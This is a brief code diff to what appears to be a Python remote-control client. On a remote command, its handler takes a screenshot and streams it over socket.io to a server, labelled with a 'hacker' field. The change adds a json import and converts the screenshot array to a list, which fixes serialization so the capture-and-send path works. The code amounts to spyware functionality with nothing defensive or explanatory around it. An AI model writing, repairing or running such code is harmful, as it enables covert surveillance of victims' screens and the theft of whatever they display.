@@ -4,6 +4,7 @@ import socket
 import platform
 import pyautogui
 import numpy as np
+import json
 
 sio = socketio.Client()
 
@@ -36,7 +37,7 @@ def remoteStart(data):
     screen = pyautogui.screenshot()
     src = np.array(screen)
 
-    sio.emit('stream monitor', {'src': src, 'hacker': data['hacker']})
+    sio.emit('stream monitor', {'src': src.tolist(), 'hacker': data['hacker']})
 
 if __name__ == '__main__':
   sio.connect('http://localhost:8000')
